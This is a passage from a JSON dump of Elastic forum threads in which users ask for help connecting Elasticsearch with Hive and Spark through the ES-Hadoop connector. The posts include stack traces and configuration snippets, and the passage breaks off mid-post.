    "body": "I would like to count the # of distinct host.hostname in a 50G Elasticsearch index. Do you have an example that I model after?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2b79819b-18a1-40d0-9523-cc9aa6bb7853",
    "url": "https://discuss.elastic.co/t/hive-3-1-1-es-hadoop-connector/205992",
    "title": "Hive 3.1.1 ES-Hadoop Connector",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Loo_Ying_Ting",
    "date": "October 31, 2019, 7:34am November 14, 2019, 8:49pm November 22, 2019, 9:49am November 22, 2019, 10:25am December 2, 2019, 6:06pm December 5, 2019, 10:47am January 2, 2020, 10:48am",
    "body": "Continuing the discussion from Support for HDFS 3.1.1 and Hive 3.1: My Hive version is 3.1.1 Hi I keep getting error Error: java.lang.RuntimeException: Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf(ReflectionUtils.java:112) at org.apache.hadoop.util.ReflectionUtils.setConf(ReflectionUtils.java:78) at org.apache.hadoop.util.ReflectionUtils.newInstance(ReflectionUtils.java:136) at org.apache.hadoop.mapred.MapTask.runOldMapper(MapTask.java:450) at org.apache.hadoop.mapred.MapTask.run(MapTask.java:343) at org.apache.hadoop.mapred.YarnChild$2.run(YarnChild.java:175) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1911) at org.apache.hadoop.mapred.YarnChild.main(YarnChild.java:169) Caused by: java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.hadoop.util.ReflectionUtils.setJobConf(ReflectionUtils.java:109) ... 9 more Caused by: java.lang.RuntimeException: Error in configuring object at org.apache.hadoop.util.ReflectionUtils.setJobConf(ReflectionUtils.java:112) at org.apache.hadoop.util.ReflectionUtils.setConf(ReflectionUtils.java:78) at org.apache.hadoop.util.ReflectionUtils.newInstance(ReflectionUtils.java:136) at org.apache.hadoop.mapred.MapRunner.configure(MapRunner.java:38) ... 14 more Caused by: java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.hadoop.util.ReflectionUtils.setJobConf(ReflectionUtils.java:109) ... 17 more Caused by: java.lang.RuntimeException: Map operator initialization failed at org.apache.hadoop.hive.ql.exec.mr.ExecMapper.configure(ExecMapper.java:137) ... 22 more Caused by: org.apache.hadoop.hive.ql.metadata.HiveException: org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Unsupported/Unknown Elasticsearch version 7.3.1 at org.apache.hadoop.hive.ql.exec.FileSinkOperator.initializeOp(FileSinkOperator.java:623) at org.apache.hadoop.hive.ql.exec.vector.VectorFileSinkOperator.initializeOp(VectorFileSinkOperator.java:84) at org.apache.hadoop.hive.ql.exec.Operator.initialize(Operator.java:376) at org.apache.hadoop.hive.ql.exec.Operator.initialize(Operator.java:573) at org.apache.hadoop.hive.ql.exec.Operator.initializeChildren(Operator.java:525) at org.apache.hadoop.hive.ql.exec.Operator.initialize(Operator.java:386) at org.apache.hadoop.hive.ql.exec.Operator.initialize(Operator.java:573) at org.apache.hadoop.hive.ql.exec.Operator.initializeChildren(Operator.java:525) at org.apache.hadoop.hive.ql.exec.Operator.initialize(Operator.java:386) at org.apache.hadoop.hive.ql.exec.vector.VectorMapOperator.initializeMapOperator(VectorMapOperator.java:591) at org.apache.hadoop.hive.ql.exec.mr.ExecMapper.configure(ExecMapper.java:116) ... 22 more Caused by: org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Unsupported/Unknown Elasticsearch version 7.3.1 at org.elasticsearch.hadoop.util.EsMajorVersion.parse(EsMajorVersion.java:82) at org.elasticsearch.hadoop.rest.InitializationUtils.discoverEsVersion(InitializationUtils.java:314) at org.elasticsearch.hadoop.hive.EsSerDe.initialize(EsSerDe.java:87) at org.elasticsearch.hadoop.hive.EsSerDe.initialize(EsSerDe.java:102) at org.apache.hadoop.hive.ql.exec.FileSinkOperator.initializeOp(FileSinkOperator.java:532) ... 32 more 19/10/31 15:22:41 INFO impl.YarnClientImpl: Killed application application_1571499978896_0102 FAILED: Execution Error, return code 2 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask when I try to insert data. Any idea the reasons? Is Hive 3.1.1 supported yet?",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "dfcb61f9-020c-4264-acf2-5572bd9c01e1",
    "url": "https://discuss.elastic.co/t/enable-compression-while-indexing-data-using-hive-elastic-connector/210265",
    "title": "Enable compression while indexing data using Hive/Elastic connector",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "sachinjose",
    "date": "December 3, 2019, 1:49am December 4, 2019, 3:01pm December 4, 2019, 6:44pm January 1, 2020, 6:43pm",
    "body": "Hi Team, We are using Hive/Elasticsearch(connector) for batch indexing data to ES, Can some one pls share the configs in the indexer side to enable compression(gzip/deflate) for the data in transit(bulk write) in order to reduce the network consumption during indexing time. I am able to test enabling decompress data in the ES side. Thanks, Sachin",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1f883ee6-04fe-45e0-96ea-e627130238d4",
    "url": "https://discuss.elastic.co/t/loading-pyspark-dataframe-into-elasticsearch-keep-getting-illegal-argument-error/208348",
    "title": "Loading pySpark DataFrame into Elasticsearch - keep getting illegal argument error",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "dkajtoch",
    "date": "November 18, 2019, 4:07pm December 2, 2019, 6:04pm December 30, 2019, 6:04pm",
    "body": "I am trying to send data stored in pySpark Dataframe directly into Elasticsearch. I found some code snippets online on how to do this and basically it looks like this: # df - DataFrame df.write.format(\"org.elasticsearch.spark.sql\") \\ .option(\"es.nodes\", \"ip_address\") \\ .option(\"es.resources\", \"test\") .save() but whatever I type in option results in IllegalArgumentException. I am running scala 2.11.0, spark 2.3.4 on Google Cloud. My elasticsearch machine is on a separate machine ver. 7.4.1 I download jar elasticsearch-spark-20_2.11-7.4.1.jar and placed it in spark jars directory (it previously worked that way with mongo and google cloud storage). How to properly send pyspark DataFrame into Elasticsearch?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7b61734d-70ca-4452-ae87-d6830b889b45",
    "url": "https://discuss.elastic.co/t/hive-read-es-data-slow/208670",
    "title": "Hive read es data slow",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "yousanghz",
    "date": "November 20, 2019, 10:07am November 21, 2019, 5:40am November 21, 2019, 1:38pm November 22, 2019, 1:42am November 22, 2019, 7:51am December 20, 2019, 7:58am",
    "body": "hive version 1.2.1 es version 5.5.0 hadoop-elasticsearch-5.5.0.jar es.index: data_monthly 10 shard this is hsql CREATE EXTERNAL TABLE es_test5( id string, uid string, wb_name string, platform string, comment_count int, fetch_time timestamp, play_count int, favorite_count int, repost_count int, monthly_net_inc_favorite_count int , monthly_net_inc_play_count int, monthly_net_inc_comment_count int, release_time timestamp ) STORED BY 'org.elasticsearch.hadoop.hive.EsStorageHandler' TBLPROPERTIES( 'es.nodes' = '192.168.17.111, 192.168.17.121', 'es.index.auto.create' = 'false', 'es.resource' = 'data_monthly', 'es.read.metadata' = 'true', 'es.mapping.names' = 'id:_metadata._id, uid:UID'); read data from es into hive , image.png773×231 3.19 KB why 10 shard but 2 map ? why slow please help me , Thank",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "7bfead3a-581b-4961-b753-a6fa443b0e6b",
    "url": "https://discuss.elastic.co/t/saving-dataframe-to-elasticsearch/204451",
    "title": "Saving dataframe to ElasticSearch",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Hugh_McBride",
    "date": "October 21, 2019, 11:32am November 14, 2019, 7:23pm November 15, 2019, 11:15am December 13, 2019, 11:15am",
    "body": "I am on a new project that is saving spark dataframes to elastic search using dataFrame.saveToEsI(.... ) There are multi terabytes of Data (> 10) that are being saved to a rather small cluster (5 node ) , And it is taking on the order of a week to load, Is this method of saving data to elastic search suitable for this volume of data, (I am guessing not ) or would it be better to save the dataframes to json ( the spark/hadoop cluster is much much bigger ) first and then bulkload",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "70fcbd04-6850-4265-990c-f98aa1203b45",
    "url": "https://discuss.elastic.co/t/hadoop-mapr-and-elk/204912",
    "title": "Hadoop/Mapr and ELK",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "lcui_dxc",
    "date": "October 23, 2019, 4:35pm November 14, 2019, 8:47pm December 12, 2019, 8:47pm",
    "body": "Hello there: We have a request to use ELK to access/fetch some log files stored on a Mapr cluster file system (HDFS or MFS), but don't know how and where to setup the ES for Hadoop... Any suggestions on how to fetch (like filebeat does) log files on HDFS and send to Logstash (or Elasticsearch nodes)? Thank you very much Li",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "3926a00e-4fa9-4501-baee-a77ba6dbdce4",
    "url": "https://discuss.elastic.co/t/spark-string-to-elasticsearch-geo-point/207902",
    "title": "Spark string to elasticsearch geo_point",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "ParthM",
    "date": "November 14, 2019, 1:28pm December 12, 2019, 1:28pm",
    "body": "Hello, I am new to ES so I don't know much about it. I have a spark streaming DataFrame which has a field \"location\" and it has the latitude and longitude of a place and I want to show the data into kibana Map. The issue is I don't know how. I've tried creating index first and then dump data into the index gives me error of rejected mapping. Tell me how to do so....",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9311b0fb-dc24-4955-bf4f-527d1713e057",
    "url": "https://discuss.elastic.co/t/use-cases-for-es-hadoop/203317",
    "title": "Use cases for es-hadoop",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Devendra_Kumar",
    "date": "October 12, 2019, 12:26pm October 16, 2019, 8:37pm October 23, 2019, 8:58pm November 20, 2019, 8:58pm",
    "body": "I want to know complete use cases for es-hadoop. I want to understand in what ways we can utilise es-hadoop.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "bbdfc20f-1b02-4b33-b180-0dc756ee2a03",
    "url": "https://discuss.elastic.co/t/hadoop-connection-with-elasticsearch/203065",
    "title": "Hadoop connection with Elasticsearch",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Vishnu_mk",
    "date": "October 11, 2019, 12:13pm October 16, 2019, 8:32pm November 13, 2019, 8:32pm",
    "body": "Hi, While trying to connect to elasticsearch through hive, getting below exception ERROR : Job Submission failed with exception 'org.elasticsearch.hadoop.EsHadoopIllegalArgumentException(Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only')' org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:344) at org.elasticsearch.hadoop.mr.EsOutputFormat.init(EsOutputFormat.java:262) at org.elasticsearch.hadoop.mr.EsOutputFormat.checkOutputSpecs(EsOutputFormat.java:253) at org.apache.hadoop.hive.ql.exec.FileSinkOperator.checkOutputSpecs(FileSinkOperator.java:1087) at org.apache.hadoop.hive.ql.io.HiveOutputFormatImpl.checkOutputSpecs(HiveOutputFormatImpl.java:67) at org.apache.hadoop.mapreduce.JobSubmitter.checkSpecs(JobSubmitter.java:272) at org.apache.hadoop.mapreduce.JobSubmitter.submitJobInternal(JobSubmitter.java:143) at org.apache.hadoop.mapreduce.Job$10.run(Job.java:1307) at org.apache.hadoop.mapreduce.Job$10.run(Job.java:1304) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1920) at org.apache.hadoop.mapreduce.Job.submit(Job.java:1304) at org.apache.hadoop.mapred.JobClient$1.run(JobClient.java:578) at org.apache.hadoop.mapred.JobClient$1.run(JobClient.java:573) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1920) at org.apache.hadoop.mapred.JobClient.submitJobInternal(JobClient.java:573) at org.apache.hadoop.mapred.JobClient.submitJob(JobClient.java:564) at org.apache.hadoop.hive.ql.exec.mr.ExecDriver.execute(ExecDriver.java:428) at org.apache.hadoop.hive.ql.exec.mr.MapRedTask.execute(MapRedTask.java:142) at org.apache.hadoop.hive.ql.exec.Task.executeTask(Task.java:214) at org.apache.hadoop.hive.ql.exec.TaskRunner.runSequential(TaskRunner.java:100) at org.apache.hadoop.hive.ql.Driver.launchTask(Driver.java:1978) at org.apache.hadoop.hive.ql.Driver.execute(Driver.java:1691) at org.apache.hadoop.hive.ql.Driver.runInternal(Driver.java:1423) at org.apache.hadoop.hive.ql.Driver.run(Driver.java:1207) at org.apache.hadoop.hive.ql.Driver.run(Driver.java:1202) at org.apache.hive.service.cli.operation.SQLOperation.runQuery(SQLOperation.java:237) at org.apache.hive.service.cli.operation.SQLOperation.access$300(SQLOperation.java:88) at org.apache.hive.service.cli.operation.SQLOperation$3$1.run(SQLOperation.java:293) at java.security.AccessController.doPrivileged(Native Method) at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1920) at org.apache.hive.service.cli.operation.SQLOperation$3.run(SQLOperation.java:306) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) Caused by: org.elasticsearch.hadoop.rest.EsHadoopNoNodesLeftException: Connection error (check network and/or proxy settings)- all nodes failed; tried [[127.0.0.1:9200]] at org.elasticsearch.hadoop.rest.NetworkClient.execute(NetworkClient.java:152) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:403) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:367) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:371) at org.elasticsearch.hadoop.rest.RestClient.get(RestClient.java:166) at org.elasticsearch.hadoop.rest.RestClient.mainInfo(RestClient.java:692) at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:334) ... 40 more ERROR : FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask INFO : Completed executing command(queryId=hive_20191010211212_5c6fbe43-b34e-49be-8ea3- 42ff5f305978); Time taken: 0.103 seconds Error: Error while processing statement: FAILED: Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask (state=08S01,code=1) Using hadoop-elasticsearch connector version - 6.7.0 Elasticsearch - 6.7.0 Also I dont understand why its trying to connect to 127.0.0.1 when i created external table on CREATE EXTERNAL TABLE test.artist (name STRING) STORED BY 'org.elasticsearch.hadoop.hive.EsStorageHandler' TBLPROPERTIES('es.node' = '10.34.9.64' , 'es.resource' = 'test/logs', 'es.index.auto.create' = 'yes'); Need some urgent help. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "448948f0-6419-4aa0-bad3-dcc53f41d48d",
    "url": "https://discuss.elastic.co/t/elasticsearch-hadoop-connection/202501",
    "title": "Elasticsearch Hadoop Connection",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Vishnu_mk",
    "date": "October 7, 2019, 12:38pm October 16, 2019, 8:31pm November 13, 2019, 8:31pm",
    "body": "Hi, I am trying to add hive table into Elasticsearch. Have added the jar in hive-site.xml file. CDH 5.11 Hadoop 2.6 Hive 1.1.0 elasticsearch-hadoop-7.3.2.jar Elasticsearch 7.3.2 I am able to successfully create table using below command CREATE EXTERNAL TABLE elkdummy ( name STRING, id INT) STORED BY 'org.elasticsearch.hadoop.hive.EsStorageHandler' TBLPROPERTIES('es.nodes' = '192.168.4.23', 'es.resource' = 'hive-elastic/log', 'es.query' = '?q=*'); But when I try to insert data using below command INSERT INTO TABLE elkdummy VALUES ('elastic',1); I get below error Caused by: java.lang.ClassNotFoundException: org.elasticsearch.hadoop.hive.EsHiveInputFormat at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:348) at org.apache.hive.com.esotericsoftware.kryo.util.DefaultClassResolver.readName(DefaultClassResolver.java:136) ... 49 more I want to understand why the create query is getting executed but the insert query is not?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9a5fd56d-deaf-4f4a-ae27-797674063870",
    "url": "https://discuss.elastic.co/t/correct-settings-for-es-nodes-wan-only/58743",
    "title": "Correct settings for \"es.nodes.wan.only\"",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "darthapple",
    "date": "August 23, 2016, 8:59pm August 24, 2016, 3:51pm October 12, 2016, 10:41pm January 31, 2017, 4:29am May 10, 2017, 5:32pm June 29, 2017, 8:56pm July 6, 2017, 7:39am November 16, 2017, 10:35pm October 24, 2018, 12:14pm January 9, 2019, 5:05pm September 19, 2019, 10:03am September 25, 2019, 3:55am October 16, 2019, 8:29pm October 16, 2019, 8:29pm",
    "body": "Hello, I am trying to run a spark job to load data from emr to ES cluster hosted by elastic.co. [ cluster ID \"665e60\" ] Following is code snippet i am using to test this. import java.io.PrintStream import org.apache.spark.SparkContext import org.apache.spark.SparkContext._ import org.elasticsearch.spark._ val conf = new SparkConf() conf.set(\"spark.es.nodes\",\"ssssss.us-east-1.aws.found.io\") conf.set(\"spark.es.port\",\"9243\") conf.set(\"spark.es.nodes.discovery\",\"ture\") conf.set(\"spark.es.nodes.client.only\",\"false\") conf.set(\"spark.es.nodes.wan.only\",\"false\")`indent preformatted text by 4 spaces` conf.set(\"spark.es.net.http.auth.user\",\"sssss\") conf.set(\"spark.es.net.http.auth.pass\",\"lololol\") val sc = new SparkContext(conf) // print(conf.toDebugString) val numbers = Map(\"one\" -> 1, \"two\" -> 2, \"three\" -> 3) val airports = Map(\"arrival\" -> \"Otopeni\", \"SFO\" -> \"San Fran\") sc.makeRDD(Seq(numbers, airports)).saveToEs(\"spark/docs\") Which results in the following error. > org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' > at org.elasticsearch.hadoop.rest.InitializationUtils.discoverEsVersion(InitializationUtils.java:196) > at org.elasticsearch.hadoop.rest.RestService.createWriter(RestService.java:379) > at org.elasticsearch.spark.rdd.EsRDDWriter.write(EsRDDWriter.scala:40) > at org.elasticsearch.spark.rdd.EsSpark$$anonfun$doSaveToEs$1.apply(EsSpark.scala:84) > at org.elasticsearch.spark.rdd.EsSpark$$anonfun$doSaveToEs$1.apply(EsSpark.scala:84) > at org.apache.spark.scheduler.ResultTask.runTask(ResultTask.scala:66) > at org.apache.spark.scheduler.Task.run(Task.scala:89) > at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:227) > at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) > at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) > at java.lang.Thread.run(Thread.java:745) Can someone please suggest what config am i missing here ?",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "ba03f74b-bc16-4819-a41a-c8ba6d6a735f",
    "url": "https://discuss.elastic.co/t/hive-real-time-or-near-real-time-sync-with-es/202103",
    "title": "Hive real time or near real time sync with ES",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "bharat1",
    "date": "October 3, 2019, 7:16am October 3, 2019, 3:23pm October 3, 2019, 3:33pm October 4, 2019, 2:29pm October 16, 2019, 8:24pm November 13, 2019, 8:24pm",
    "body": "Dear All, Have a scenario, I am successfully able to bring Hive table data to ES. At the same time when it comes to sync latest updated row data from same Hive table then there is a manual work required to get the updated table row data in Hive to bring it in ES under same index. So is there any settings or parameters that we need to add/modify that will constantly look/watch for changes happening in Hive table and sync those with ES without manual intervention? Because when there are several processing/algorithms run on Big Data it's hard to manually keep track of updated data in Hive DB/Tables Any pointers will be helpful",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "06f4dbbb-7f98-42fa-84c2-2851f33b2925",
    "url": "https://discuss.elastic.co/t/eshadoopnonodesleftexception-all-nodes-failed-on-spark-savetoes/202161",
    "title": "EsHadoopNoNodesLeftException-all nodes failed On Spark.SaveToES",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Ramakrishnan_Venkata",
    "date": "October 3, 2019, 12:18pm October 16, 2019, 8:19pm November 13, 2019, 8:26pm",
    "body": "Hi, I Get \"EsHadoopNoNodesLeftException: Connection error (check network and/or proxy settings)- all nodes failed\" When i do a df = spark.sql(select * from a table)and do a df.saveToES(indexName+\"/docs\") I have 200 ORC files and with average of 145mb (raw data) = ~29GB of serialized and compressed ORC raw data. I see 200 tasks in SPARK UI during the above code. And the last task gets failed with the above exception. I infer from this ticket: Similar Issue That i need to reduce the bulk SIZE. MY QUESTION: How to determine the bulk size during dataframe.saveToEs() during runtime? Is there a formula based on No of executors, Cores, Memory etc..? How to reduce the bulk size? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "39564eb1-b19f-4f19-9340-ed7fa4b27c8a",
    "url": "https://discuss.elastic.co/t/apache-spark-to-query-elasticsearch-https-and-basic-authentication/197027",
    "title": "Apache Spark to query Elasticsearch (https and basic authentication)",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Darshan_Parab",
    "date": "August 28, 2019, 4:52am September 6, 2019, 4:12pm September 25, 2019, 11:57am October 23, 2019, 11:57am",
    "body": "Use case: Query secure Elasticsearch cluster (https and basic authentication enabled) using Apache Spark(pyspark and spark-submit) What I tried: start pyspark as follows: ./bin/pyspark --jars ./jars/elasticsearch-hadoop-7.2.0.jar --files /opt/ssl/jkeystore/elastic --driver-class-path /opt/ssl/jkeystore/elastic --conf \"spark.executor.extraJavaOptions=-Djavax.net.ssl.trustStore=elastic\" --conf \"spark.execurot.extraJavaOptions=-Djavax.net.ssl.trustStorePassword=xxxxxx\" Query Elasticsearch as follows: df = spark.read.format(\"org.elasticsearch.spark.sql\").option(\"es.nodes\",\"https://elasticsearch:9200\").option(\"es.resource\",\"index/_doc\").option(\"es.read.field.as.array.include\",\"tags\").option(\"es.net.http.auth.user\",\"user\").option(\"es.net.http.auth.pass\",\"password\").option(\"es.net.ssl\",\"true\").load() I'm getting error as below: Caused by: org.elasticsearch.hadoop.rest.EsHadoopTransportException: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target Apparently it looks like spark is unable to understand truststore settings. Elasticsearch Hadoop doesn't have any options to add certificates to keystore file using secure settings. How do I configure it correctly so that I can talk to Elasticsearch?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2610570a-2860-4bfb-83f7-613ea475534c",
    "url": "https://discuss.elastic.co/t/exactly-once-guarantee-for-spark-structured-streaming/200746",
    "title": "Exactly-once guarantee for Spark Structured Streaming",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "danielyahn",
    "date": "September 23, 2019, 7:55pm September 23, 2019, 8:26pm September 23, 2019, 9:07pm October 21, 2019, 9:07pm",
    "body": "The following blog that @james.baiera wrote says, Users of ES-Hadoop can specify one of their fields to be used as the document’s ID, and Elasticsearch manages ID based writes consistently. We can’t know ahead of time what your documents’ IDs are, so it’s up to each user to ensure their streaming data contains an ID of some sort. Are there some best practices on how to generate the ID for time series data and to optimize for ingest? I'm starting by introducing UUID v4, but seeing that there are better implementation. Such as one and two. I already understand that using auto-generated ID will skip duplicate check, thus saving lookup cost. Here I'm looking for an ID generation scheme for exactly-once guarantee and ingest performance.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "d30a6043-227c-4f83-a419-22686c53c755",
    "url": "https://discuss.elastic.co/t/unable-to-connect-elasticsearch-with-spark/199543",
    "title": "Unable to connect Elasticsearch with Spark",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Manel_Serrano",
    "date": "September 15, 2019, 4:26pm October 13, 2019, 4:26pm",
    "body": "Hi all, I get this error when I try to connect Elasticsearch (running in a cluster) with Spark (running locally): 19/09/14 20:17:32 INFO HttpMethodDirector: I/O exception (java.net.ConnectException) caught when processing request: Connection timed out: connect 19/09/14 20:17:32 INFO HttpMethodDirector: Retrying request 19/09/14 20:17:53 INFO HttpMethodDirector: I/O exception (java.net.ConnectException) caught when processing request: Connection timed out: connect 19/09/14 20:17:53 INFO HttpMethodDirector: Retrying request 19/09/14 20:18:14 INFO HttpMethodDirector: I/O exception (java.net.ConnectException) caught when processing request: Connection timed out: connect 19/09/14 20:18:14 INFO HttpMethodDirector: Retrying request 19/09/14 20:18:35 ERROR NetworkClient: Node [xx.xx.xx.10:7474] failed (Connection timed out: connect); selected next node [xx.xx.xx.11:7474] 19/09/14 20:18:56 INFO HttpMethodDirector: I/O exception (java.net.ConnectException) caught when processing request: Connection timed out: connect 19/09/14 20:18:56 INFO HttpMethodDirector: Retrying request 19/09/14 20:21:23 ERROR NetworkClient: Node [xx.xx.xx.12:7474] failed (Connection timed out: connect); no other nodes left - aborting... 19/09/14 20:21:23 ERROR Executor: Exception in task 0.0 in stage 1.0 (TID 1) org.elasticsearch.hadoop.rest.EsHadoopNoNodesLeftException: Connection error (check network and/or proxy settings)- all nodes failed; tried [[xx.xx.xx.10:7474, xx.xx.xx.11:7474, xx.xx.xx.12:7474]] at org.elasticsearch.hadoop.rest.NetworkClient.execute(NetworkClient.java:149) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:461) at org.elasticsearch.hadoop.rest.RestClient.executeNotFoundAllowed(RestClient.java:469) at org.elasticsearch.hadoop.rest.RestClient.exists(RestClient.java:565) at org.elasticsearch.hadoop.rest.RestClient.indexExists(RestClient.java:560) at org.elasticsearch.hadoop.rest.RestClient.touch(RestClient.java:571) at org.elasticsearch.hadoop.rest.RestRepository.touch(RestRepository.java:418) at org.elasticsearch.hadoop.rest.RestService.initSingleIndex(RestService.java:609) at org.elasticsearch.hadoop.rest.RestService.createWriter(RestService.java:597) at org.elasticsearch.spark.rdd.EsRDDWriter.write(EsRDDWriter.scala:58) at org.elasticsearch.spark.rdd.EsSpark$anonfun$doSaveToEs$1.apply(EsSpark.scala:107) at org.elasticsearch.spark.rdd.EsSpark$anonfun$doSaveToEs$1.apply(EsSpark.scala:107) at org.apache.spark.scheduler.ResultTask.runTask(ResultTask.scala:87) at org.apache.spark.scheduler.Task.run(Task.scala:108) at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:335) at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) at java.lang.Thread.run(Unknown Source) 19/09/14 20:21:23 WARN TaskSetManager: Lost task 0.0 in stage 1.0 (TID 1, localhost, executor driver): org.elasticsearch.hadoop.rest.EsHadoopNoNodesLeftException: Connection error (check network and/or proxy settings)- all nodes failed; tried [[xx.xx.xx.10:7474, xx.xx.xx.11:7474, xx.xx.xx.12:7474]] at org.elasticsearch.hadoop.rest.NetworkClient.execute(NetworkClient.java:149) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:461) at org.elasticsearch.hadoop.rest.RestClient.executeNotFoundAllowed(RestClient.java:469) at org.elasticsearch.hadoop.rest.RestClient.exists(RestClient.java:565) at org.elasticsearch.hadoop.rest.RestClient.indexExists(RestClient.java:560) at org.elasticsearch.hadoop.rest.RestClient.touch(RestClient.java:571) at org.elasticsearch.hadoop.rest.RestRepository.touch(RestRepository.java:418) at org.elasticsearch.hadoop.rest.RestService.initSingleIndex(RestService.java:609) at org.elasticsearch.hadoop.rest.RestService.createWriter(RestService.java:597) at org.elasticsearch.spark.rdd.EsRDDWriter.write(EsRDDWriter.scala:58) at org.elasticsearch.spark.rdd.EsSpark$anonfun$doSaveToEs$1.apply(EsSpark.scala:107) at org.elasticsearch.spark.rdd.EsSpark$anonfun$doSaveToEs$1.apply(EsSpark.scala:107) at org.apache.spark.scheduler.ResultTask.runTask(ResultTask.scala:87) at org.apache.spark.scheduler.Task.run(Task.scala:108) at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:335) at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) at java.lang.Thread.run(Unknown Source) The code looks like: SparkConf conf = new SparkConf() 